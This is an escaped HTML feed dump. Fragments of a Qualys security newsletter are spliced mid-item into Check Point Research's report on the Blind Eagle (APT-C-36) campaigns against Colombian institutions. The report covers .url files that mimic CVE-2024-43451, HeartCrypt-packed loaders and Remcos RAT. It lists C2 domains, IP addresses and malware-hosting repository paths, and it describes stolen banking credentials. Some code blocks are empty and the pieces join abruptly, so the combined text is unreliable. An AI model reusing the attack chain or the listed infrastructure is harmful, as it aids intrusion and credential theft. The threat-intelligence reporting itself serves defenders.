&lt;li&gt;&lt;strong&gt;Leverage unified risk prioritization framework&lt;/strong&gt;: &lt;em&gt;Risk = Likelihood (Qualys Detection Score) x Impact (Asset Criticality Score)&lt;/em&gt; formula to &lt;strong&gt;guide decision-making and focus efforts &lt;/strong&gt;on what truly matters.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;No matter their starting point, Qualys empowers organizations to elevate their risk strategies with clarity and precision. The &lt;a href="https://www.qualys.com/enterprise-trurisk-platform/"&gt;Qualys Enterprise TruRisk platform&lt;/a&gt; transforms risk reduction into a measurable, strategic advantage, ensuring security efforts are focused, efficient, and impactful.

&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A critical out-of-bounds write vulnerability (CVE-2025-22224), which is actively exploited, is &lt;a href="https://www.bleepingcomputer.com/news/security/over-37-000-vmware-esxi-servers-vulnerable-to-ongoing-attacks/"&gt;affecting&lt;/a&gt; over 37,000 internet-exposed VMware ESXi servers. This flaw allows local attackers with administrative privileges on a VM guest to escape the sandbox and execute code on the host as the VMX process. Despite available patches and the flaw inclusion in CISA’s Known Exploited Vulnerabilities (KEV) Catalog, a significant number of servers remain unpatched.&lt;/li&gt;
&lt;li&gt;Google has &lt;a href="https://source.android.com/docs/security/bulletin/2025-03-01"&gt;released&lt;/a&gt; its March 2025 Android Security Bulletin, addressing 44 flaws, two of them are high-severity ones actively exploited: a privilege escalation in the Framework component (CVE-2024-43093), and a privilege escalation in the HID USB component of the Linux kernel (CVE-2024-50302).&lt;/li&gt;
&lt;li&gt;CISA has &lt;a href="https://www.cisa.gov/news-events/alerts/2025/03/03/cisa-adds-five-known-exploited-vulnerabilities-catalog"&gt;added&lt;/a&gt; five security flaws &lt;a href="https://thehackernews.com/2025/03/cisco-hitachi-microsoft-and-progress.html"&gt;affecting&lt;/a&gt; Cisco, Hitachi Vantara, Microsoft, and Progress WhatsUp Gold to its KEV catalog.

It primarily targets organizations in Colombia and other Latin American countries. Active since 2018, this Advanced Persistent Threat (APT) group focuses on government institutions, financial organizations, and critical infrastructure. Blind Eagle is known for employing [&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/"&gt;Blind Eagle: …And Justice for All&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered a series of ongoing campaigns targeting Colombian institutions and government entities since November 2024. The campaigns are linked to &lt;strong&gt;Blind Eagle&lt;/strong&gt;, also known as &lt;strong&gt;APT-C-36&lt;/strong&gt;, and deliver malicious &lt;code&gt;.url&lt;/code&gt; files, which cause a similar effect to the &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; vulnerability.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt; exposes a user&amp;#8217;s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. This vulnerability can be triggered just by right-clicking, deleting, or dragging the file. While the Blind Eagle malicious file does not exploit this vulnerability, it triggers a WebDAV request in the same uncommon ways, notifying the attacker that the file was downloaded. Finally, when the user clicks on the file, it downloads the next-stage payload via another WebDAV request and executes the malware.&lt;/li&gt;



&lt;li&gt;Microsoft patched the original vulnerability on November 12, 2024. Just &lt;strong&gt;six days&lt;/strong&gt; later, &lt;strong&gt;Blind Eagle&lt;/strong&gt; included this &lt;code&gt;.url&lt;/code&gt; variant in its attack arsenal and campaigns.&lt;/li&gt;



&lt;li&gt;The monitored campaigns targeted Colombian judicial institutions and other government or private organizations, with high infection rates. More than &lt;strong&gt;1,600&lt;/strong&gt; victims were affected during one of these campaigns which took place around December 19, 2024. This infection rate is significant considering Blind Eagle&amp;#8217;s targeted APT approach.&lt;/li&gt;



&lt;li&gt;The malware is often delivered using legitimate file-sharing platforms such as &lt;strong&gt;Google Drive&lt;/strong&gt; and &lt;strong&gt;Dropbox&lt;/strong&gt;. However, in recent campaigns, Blind Eagle has also distributed its payloads through &lt;strong&gt;Bitbucket&lt;/strong&gt; and &lt;strong&gt;GitHub&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;The group utilizes malware and tools which are well-known within underground crime communities, a trend that continues with recent discoveries. To protect its malware, Blind Eagle leverages the Packer-as-a-Service &lt;strong&gt;HeartCrypt&lt;/strong&gt;, which employs a .NET RAT that appears to be a variant of&amp;nbsp; &lt;strong&gt;PureCrypter&lt;/strong&gt;. The final stage payload is &lt;strong&gt;Remcos RAT&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;Blind Eagle has long been suspected to originate from &lt;strong&gt;South America&lt;/strong&gt;. We identified the group&amp;#8217;s operating timezone as &lt;strong&gt;UTC-5&lt;/strong&gt;, which aligns with several &lt;strong&gt;South American&lt;/strong&gt; countries.&lt;/li&gt;



&lt;li&gt;Operation fail (OPFail) revealed phishing campaigns in early March 2024 in which the group impersonated Colombian banks. These campaigns were highly successful, resulting in the collection of over &lt;strong&gt;8,000&lt;/strong&gt; entries of Personally Identifiable Information (PII).&lt;/li&gt;
&lt;/ul&gt;



&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;APT-C-36&lt;/strong&gt;, also known as &lt;strong&gt;Blind Eagle&lt;/strong&gt;, is a threat group that engages in both &lt;strong&gt;espionage and cybercrime&lt;/strong&gt;. It primarily targets organizations in &lt;strong&gt;Colombia&lt;/strong&gt; and other &lt;strong&gt;Latin American countries&lt;/strong&gt;. Active since &lt;strong&gt;2018&lt;/strong&gt;, this &lt;strong&gt;Advanced Persistent Threat (APT)&lt;/strong&gt; group focuses on &lt;strong&gt;government institutions, financial organizations, and critical infrastructure&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Blind Eagle is known for employing &lt;strong&gt;sophisticated social engineering tactics&lt;/strong&gt;, using &lt;strong&gt;phishing emails&lt;/strong&gt; with &lt;strong&gt;malicious attachments or links&lt;/strong&gt; to gain initial access to target systems. Their malware arsenal includes &lt;strong&gt;commodity Remote Access Trojans (RATs)&lt;/strong&gt; such as &lt;strong&gt;NjRAT&lt;/strong&gt;, &lt;strong&gt;AsyncRAT&lt;/strong&gt;, and &lt;strong&gt;Remcos&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Our research revealed that the group recently expanded its toolkit with additional commodity malware. To protect their malicious executables, Blind Eagle utilizes the &lt;strong&gt;Packer-as-a-Service HeartCrypt&lt;/strong&gt;, which they use to pack a &lt;strong&gt;.NET RAT&lt;/strong&gt; that appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. &lt;strong&gt;Remcos RAT&lt;/strong&gt; remains the final payload.&lt;/p&gt;



&lt;p&gt;On &lt;strong&gt;November 12, 2024&lt;/strong&gt;, &lt;strong&gt;Microsoft&lt;/strong&gt; patched a newly discovered vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43451"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt;. This vulnerability was actively &lt;strong&gt;exploited in the wild&lt;/strong&gt; using &lt;code&gt;.url&lt;/code&gt; files containing &lt;strong&gt;malicious code&lt;/strong&gt;, which could be triggered through &lt;strong&gt;unusual user actions&lt;/strong&gt; such as &lt;strong&gt;right-clicking the file&lt;/strong&gt;, &lt;strong&gt;deleting it&lt;/strong&gt;, or performing a &lt;strong&gt;drag-and-drop operation&lt;/strong&gt;. Exploited as a &lt;strong&gt;zero-day&lt;/strong&gt;, it was used in attacks targeting &lt;strong&gt;Ukraine.&lt;/strong&gt; According to &lt;strong&gt;CERT-UA&lt;/strong&gt;, the campaign was attributed to the threat actor &lt;strong&gt;UAC-0194&lt;/strong&gt;, suspected to be &lt;strong&gt;Russian-affiliated&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Six days after Microsoft released the patch, &lt;strong&gt;Blind Eagle&lt;/strong&gt; included a variant of this exploit in its attack arsenal and campaigns. While this variant does not actually expose the NTLMv2 hash, it notifies the threat actors that the file was downloaded by the same unusual user-file interactions. On devices vulnerable to &lt;strong&gt;CVE-2024-43451&lt;/strong&gt;, a &lt;strong&gt;WebDAV request&lt;/strong&gt; is triggered even before the user manually interacts with the file with the same unusual behavior. Meanwhile, on both patched and unpatched systems, manually clicking the malicious &lt;code&gt;.url&lt;/code&gt; file initiates the download and execution of the next-stage payload. After incorporating this file into their campaigns, the group targeted mainly Colombian public and private organizations, with high infection rates. More than &lt;strong&gt;1600&lt;/strong&gt; victims were infected during a campaign that occurred around December 19, 2024. Considering Blind Eagle’s targeted APT approach, this infection rate is significant.&lt;/p&gt;



&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Blind Eagle .url Payloads&lt;/h2&gt;



&lt;p&gt;&lt;a href="https://www.clearskysec.com/0d-vulnerability-exploited-in-the_wild/"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt; is a vulnerability that exposes a user&amp;#8217;s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. If the compromised account has high privileges and proper mitigations (such as SMB signing and NTLM relay protections) that are not enforced, this could lead to lateral movement, privilege escalation, or even full domain compromise. Eventually, the user, by manually clicking, creates an SMB connection through port 445, which downloads and executes the malicious payload. The exploit reported by CERT-UA:&lt;/p&gt;

&lt;p style="line-height: 15%;"&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt; affects all supported Windows versions, and it is triggered in uncommon ways:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;A single right-click on the file (all Windows versions).&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Deleting the file (Windows 10/11).&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Dragging the file to another folder (Windows 10/11 and some Windows 7/8/8.1 configurations).&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The &lt;code&gt;.url&lt;/code&gt; file below, used by Blind Eagle against Colombian institutions, is a variant of this CVE, but without the exploiting part, meaning it does not expose the NTLMv2 hash. When manually clicked by the user, this file also downloads malicious files, but instead of using &lt;strong&gt;SMB&lt;/strong&gt; (port: 445), it uses &lt;a href="https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/"&gt;HTTP&lt;/a&gt;. When a URL is in UNC Path format, it first attempts an SMB connection, and if this is unavailable, it attempts WebDAV. However, once the port is specified, which in this case is &lt;code&gt;@80&lt;/code&gt;, the &lt;strong&gt;SMB&lt;/strong&gt; attempt is avoided, and the connection is made directly over &lt;strong&gt;HTTP&lt;/strong&gt; with the &lt;strong&gt;User-Agent&lt;/strong&gt; &lt;code&gt;Microsoft-WebDAV-MiniRedir/10.0.19044&lt;/code&gt;.&lt;/p&gt;

HotKey=0
&lt;/pre&gt;



&lt;p&gt;While this variant does not directly exploit the vulnerability, it exhibits unusual behavior by communicating with the server without requiring manual user interaction. However, for the &lt;code&gt;.url&lt;/code&gt; file to download the next-stage payload, the user must manually click it, which triggers a WebDAV request over port 80.&lt;/p&gt;



&lt;p&gt;This variant serves as a valuable tool for threat actors, as it notifies them when a targeted user downloads the malicious &lt;code&gt;.url&lt;/code&gt; file. Even if the user does not directly execute the file, Blind Eagle can still detect the interaction, providing insight into potential targets.&lt;/p&gt;

&lt;p&gt;Since Microsoft patched this vulnerability, this unusual behavior no longer occurs. However, manual user interaction can still trigger the download and execution of the malicious payload.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31213" height="359" src="https://research.checkpoint.com/wp-content/uploads/2025/03/win10_gif-1.gif" style="width: 800px; height: auto;" width="800" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 2&lt;/strong&gt; &amp;#8211; Patched &amp;#8211; Windows 10, execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading"&gt;Blind Eagle Campaigns&lt;/h2&gt;



&lt;p&gt;Microsoft published this vulnerability on November 12, 2024. On November 18, we observed the first crafted payload. This &lt;code&gt;.url&lt;/code&gt; file infected both patched and unpatched machines. Since then, we observed multiple campaigns targeting Colombia, and the dropped payload was a .NET RAT that downloads the final stage from &lt;strong&gt;GitHub&lt;/strong&gt; or &lt;strong&gt;BitBucket&lt;/strong&gt;, a &lt;strong&gt;Remcos RAT&lt;/strong&gt;. However, to this day, most of those &lt;code&gt;.url&lt;/code&gt; files are not detected by any Anti-Virus engine on VirusTotal.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31214" height="332" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img1-1024x332.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt; &amp;#8211; First stage .url undetected on VT.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These ongoing campaigns, based on filenames, appear to primarily target various &lt;strong&gt;Colombian government organizations&lt;/strong&gt;, including the Justice System. These are some of the malicious &lt;code&gt;.url&lt;/code&gt; filenames:&lt;/p&gt;

&lt;p&gt;While operating with the specific malicious file for over two months, the APT group has changed approximately more than ten different C&amp;amp;Cs (Command and Control Servers) for its final stage payload. The attack chain has some small variations, but the &lt;code&gt;.url&lt;/code&gt; files are always part of the campaign during the initial stage.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Campaigns ‘socialismo’ &amp;amp; ‘miami’- January 21-22, 2025&lt;/h3&gt;



&lt;p&gt;During the campaigns that took place around January 21 and 22, 2025, the APT group distributed multiple &lt;code&gt;.url&lt;/code&gt; files via email through possibly compromised Google Drive accounts. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31215" height="836" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img2.png" width="742" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 4&lt;/strong&gt; &amp;#8211; Email with Google Drive link.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The specified file icon in the &lt;code&gt;.url&lt;/code&gt; file is equivalent to the one from the Edge browser. Many of the endpoints contacted by the &lt;code&gt;.url&lt;/code&gt; contain multiple malicious files, though we can not attribute all files hosted on those servers to &lt;strong&gt;Blind Eagle&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The downloaded executable appears to be packed using the Packer as a Service &lt;strong&gt;HeartCrypt&lt;/strong&gt;. This later injects into &lt;code&gt;csc.exe&lt;/code&gt; a .NET executable responsible for unpacking and executing in memory a .NET RAT, which appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. This .NET RAT retrieves various user and machine information such as 1) Username, 2) OS Version, 3) Process name and architecture, 4) Antivirus installed, and other machine specs. After it decrypted its configuration, which is embedded as a resource, we observed the campaign ID &lt;code&gt;socialismo&lt;/code&gt; and the C&amp;amp;C which communicates. The C&amp;amp;C &lt;code&gt;republicadominica2025[.]ip-ddns[.]com&lt;/code&gt;, after it received the user data, responded with a URL to download and execute the next stage payload. The final stage is downloaded from the GitHub repository &lt;code&gt;Oscarito20222/file&lt;/code&gt;, and the malware is the known Remote Access Trojan &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;elyeso.ip-ddns[.]com:30204&lt;/code&gt; and Botnet name &lt;code&gt;redtube&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Both of the domain names from the .NET RAT and the Remcos RAT resolve to the same IP address &lt;code&gt;177.255.85[.]101&lt;/code&gt;. The group has used this IP for multiple Remcos C&amp;amp;Cs through January &amp;amp; February campaigns:&lt;/p&gt;

&lt;/pre&gt;



&lt;p&gt;It is worth mentioning that the attacker&amp;#8217;s GitHub repository is used in multiple Blind Eagle campaigns to deliver the final stage payload, &lt;strong&gt;Remcos.&lt;/strong&gt; This repository is constantly updated with new files that communicate with the latest C&amp;amp;C. All the repository updates were committed in the timezone &lt;code&gt;-0500&lt;/code&gt;, which could possibly indicate Blind Eagle’s country of origin aligns with South American countries. Examples of commits:&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;GitHub account&lt;/strong&gt; also contains another repository named &lt;code&gt;diciembre&lt;/code&gt;, which includes an archive with a &lt;code&gt;.vbs&lt;/code&gt; file. Notably, this &lt;strong&gt;commit from two years ago&lt;/strong&gt; was made in the same &lt;strong&gt;UTC-5 timezone&lt;/strong&gt; as the recent activity.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31217" height="362" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img4-1024x362.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 6&lt;/strong&gt; &amp;#8211; Blind Eagle GitHub account.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;This repository, which was “untouched” for over two years, was updated on February 25, 2025, and introduced a new &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;21ene.ip-ddns[.]com:30204&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31218" height="316" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img5-1024x316.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 7&lt;/strong&gt; &amp;#8211; Recent &lt;code&gt;diciembre&lt;/code&gt; repository campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading"&gt;Campaigns ‘PARAISO’, ‘PARAISO2’, ‘marte’ &amp;amp; ‘saturno’ &amp;#8211; December 2024&lt;/h3&gt;



&lt;p&gt;Although similar to the previous campaign, this one leveraged &lt;strong&gt;Bitbucket&lt;/strong&gt; instead of &lt;strong&gt;GitHub&lt;/strong&gt; as the final-stage distribution platform.&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Campaign&lt;/th&gt;&lt;th&gt;.NET RAT C&amp;amp;C&lt;/th&gt;&lt;th&gt;Remcos C&amp;amp;C&lt;/th&gt;&lt;th&gt;Remcos ITW&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-10&lt;/strong&gt;] &lt;strong&gt;marte&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net -&amp;gt; 181.131.217.244&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;bitbucket[.]org/facturacioncol/fact/downloads/FileHosting.exe&lt;br /&gt;bitbucket[.]org/facturacioncol/fact/downloads/luna.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-11&lt;/strong&gt;] &lt;strong&gt;saturno&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;bitbucket[.]org/facturacioncol/fact/downloads/Out2.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-19&lt;/strong&gt;] &lt;strong&gt;PARAISO&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/ROSAS.exe&lt;br /&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/Final1278685280.exe&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;[&lt;strong&gt;2024-12-19&lt;/strong&gt;] &lt;strong&gt;PARAISO2&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;/td&gt;&lt;td&gt;newstaticfreepoint24.ddns-ip[.]net&lt;br /&gt;17dic.ydns[.]eu -&amp;gt; 181.131.217.244&lt;/td&gt;&lt;td&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/AD.exe&lt;br /&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/Simpson.exe&lt;br /&gt;bitbucket[.]org/trabajo12023/proyecto/downloads/Final1278685280.exe&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;In these campaigns, two Bitbucket repositories were abused and contained &lt;strong&gt;Remcos RAT&lt;/strong&gt; executable files, which were uploaded to &lt;strong&gt;Bitbucket&lt;/strong&gt; around &lt;strong&gt;December 2024&lt;/strong&gt;. Considering this APT group’s activity and approach, a significant number of victims ultimately downloaded these malicious executables.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31219" height="417" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img6.png" width="758" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 8&lt;/strong&gt; &amp;#8211; &lt;code&gt;facturacioncol/fact&lt;/code&gt; Bitbucket repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;PARAISO&lt;/code&gt; campaign was very successful, infecting more than &lt;strong&gt;1600&lt;/strong&gt; victims with &lt;strong&gt;Remcos RAT&lt;/strong&gt; and C&amp;amp;C &lt;code&gt;newstaticfreepoint24.ddns-ip.net:3020&lt;/code&gt;. The total infections across those campaigns, which occurred for over a week, were approximately &lt;strong&gt;9,000&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31220" height="564" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img7.png" width="830" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 9&lt;/strong&gt; &amp;#8211; &lt;code&gt;trabajo12023/proyecto&lt;/code&gt; Bitbucket repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading"&gt;Blind Eagle &amp;#8211; .url Campaigns&lt;/h3&gt;



&lt;p&gt;Since adding this file to its arsenal, &lt;strong&gt;Blind Eagle&lt;/strong&gt; consistently targeted &lt;strong&gt;Colombia&lt;/strong&gt;, primarily focusing on &lt;strong&gt;justice and other government organizations&lt;/strong&gt;. The group sent emails with malicious Google Drive links containing either an archive or the actual &lt;code&gt;.url&lt;/code&gt;. Those files triggered WebDAV requests on unpatched machines and, once clicked by the user, resulted in a WebDAV request that downloaded a &lt;strong&gt;HeartCrypt&lt;/strong&gt;-packed malware. This malware then extracted and injected a packed .NET loader into &lt;code&gt;csc.exe&lt;/code&gt;, which later loaded a .NET RAT which appears to be a variant of &lt;strong&gt;PureCrypter&lt;/strong&gt;. This .NET RAT decrypted its configuration, which contains execution parameters such as the C&amp;amp;C server and the campaign ID. After sending encrypted user data, the malware receives a URL to download the final stage payload, &lt;strong&gt;Remcos RAT&lt;/strong&gt;. Those final payloads were initially hosted on compromised servers and later on &lt;strong&gt;GitHub&lt;/strong&gt; or &lt;strong&gt;Bitbucket&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31221" height="562" src="https://research.checkpoint.com/wp-content/uploads/2025/03/img8-1024x562.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 10&lt;/strong&gt; &amp;#8211; Blind Eagle November until February Campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Throughout multiple campaigns, the group registered different domain names for its C&amp;amp;C servers, even though they were hosted on the same IP address. During campaigns such as &lt;code&gt;socialismo&lt;/code&gt;, the C&amp;amp;C of the .NET RAT was &lt;code&gt;republicadominica2025[.]ip-ddns[.]com&lt;/code&gt; and for the final stage &lt;code&gt;elyeso.ip-ddns[.]com&lt;/code&gt;, but both of them resolved to the same IP &lt;code&gt;177[.]255.85[.]101&lt;/code&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;APT OPFail &amp;amp; Past Phishing Campaigns&lt;/h3&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; was closely monitoring &lt;strong&gt;Blind Eagle&lt;/strong&gt; activities, we discovered an operation failure in which the group revealed its past phishing activities together with the victim&amp;#8217;s Personally Identifiable Information (&lt;strong&gt;PII&lt;/strong&gt;).&lt;/p&gt;



&lt;p&gt;During January and February, the APT group delivered the last stage payload via files uploaded to the &lt;code&gt;Oscarito20222/file&lt;/code&gt; repository. The account &lt;code&gt;Oscarito20222&lt;/code&gt; also had another repository, which had only one commit from two years ago, &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;On February 25, 2025, this changed. The repository &lt;code&gt;diciembre&lt;/code&gt; received updates and also began delivering &lt;strong&gt;Remcos&lt;/strong&gt; during the next campaigns. To understand why this shift occurred, we had to examine the &lt;strong&gt;previous repository&lt;/strong&gt; responsible for delivering the final payload in the attack chain.&lt;/p&gt;



&lt;p&gt;&lt;code&gt;Oscarito20222/file&lt;/code&gt; final commits:&lt;/p&gt;

&lt;/pre&gt;



&lt;p&gt;For approximately &lt;strong&gt;1 hour and 27 minutes&lt;/strong&gt;, the group uploaded an HTML file named &lt;code&gt;Ver Datos del Formulario.html&lt;/code&gt;, which was later deleted. As of now, this remains the last recorded action in the repository, which occurred on &lt;strong&gt;February 25, 2025, at 15:27 UTC&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;

&lt;p&gt;At this point, &lt;strong&gt;Blind Eagle&lt;/strong&gt; resumed its activity, using the repository &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt;, with the first commit taking place at &lt;strong&gt;17:39 UTC the same day:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Opfail Timeline:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;2025-02-25 14:01 UTC&lt;/strong&gt;, Blind Eagle uploads to &lt;code&gt;Oscarito20222/file&lt;/code&gt; HTML PII data from phishing activities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2025-02-25 15:27 UTC&lt;/strong&gt;, Deletes HTML file containing PII.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2025-02-25 17:39 UTC&lt;/strong&gt;, Uploads &lt;strong&gt;Remcos RAT&lt;/strong&gt; with C&amp;amp;C &lt;code&gt;21ene.ip-ddns[.]com&lt;/code&gt; to &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt; repository&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2025-02-25 17:39 UTC&lt;/strong&gt;, Deletes archive from &lt;code&gt;Oscarito20222/diciembre&lt;/code&gt; that was uploaded approximately two years ago.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; obtained this HTML file, which was linked to phishing activities from early March 2024. The phishing domain &lt;code&gt;servicioseguroenlineabb[.]com&lt;/code&gt; appears to have impersonated Colombian Banks.&lt;/p&gt;



&lt;p&gt;The PII data contains four fields:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Nombre de Usuario,&lt;/strong&gt; Username&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Contraseña Usuario,&lt;/strong&gt; User Password&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Correo electrónico,&lt;/strong&gt; Email&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Contraseña del correo,&lt;/strong&gt; Email Password&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Clave Cajero,&lt;/strong&gt; ATM PIN&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;The dataset (Referred to as: &lt;strong&gt;&amp;#8220;Datos del Formulario&amp;#8221;&lt;/strong&gt;) contained &lt;strong&gt;over 8,400 entries&lt;/strong&gt;, with &lt;strong&gt;8,075&lt;/strong&gt; valid after filtering out empty or insufficient records. These valid entries included &lt;strong&gt;account-password pairs&lt;/strong&gt; (username or email or all data filled), with &lt;strong&gt;1,634 email addresses&lt;/strong&gt; identified.&lt;/p&gt;



&lt;p&gt;The phishing campaign specifically targeted &lt;strong&gt;Colombian users&lt;/strong&gt;. Among the collected email addresses:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The majority were &lt;strong&gt;personal accounts&lt;/strong&gt; (Gmail, Yahoo, Hotmail, etc.).&lt;/li&gt;



